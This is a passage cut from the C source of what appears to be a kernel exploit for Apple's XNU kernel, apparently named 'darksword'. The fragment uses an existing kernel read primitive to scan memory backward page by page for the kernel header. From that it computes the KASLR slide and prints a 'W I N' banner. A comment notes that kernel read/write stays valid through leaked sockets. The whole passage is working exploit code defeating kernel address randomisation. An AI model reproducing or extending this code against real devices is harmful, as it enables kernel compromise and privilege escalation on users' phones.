			    early_kread64(kernel_base + 0x8) == 0xc00000002) {
				foundBase = true;
				break;
			}
			kernel_base -= PAGE_SIZE;
		}
		if (!foundBase) {
			printf("[-] failed to locate kernel base by scan\n");
			FAILURE(0);
		}
		kernel_slide = kernel_base - 0xfffffff007004000;

		printf("[+] kernel_base=%#llx slide=%#llx\n", kernel_base, kernel_slide);
		printf("\n=====  W I N  =====\n\n");
		darksword_won = 1;
	}
	// Run finished (R/W stays valid via leaked sockets). Allow a future run, but
	// note re-running after WIN re-does the whole exploit.
	darksword_running = 0;
}
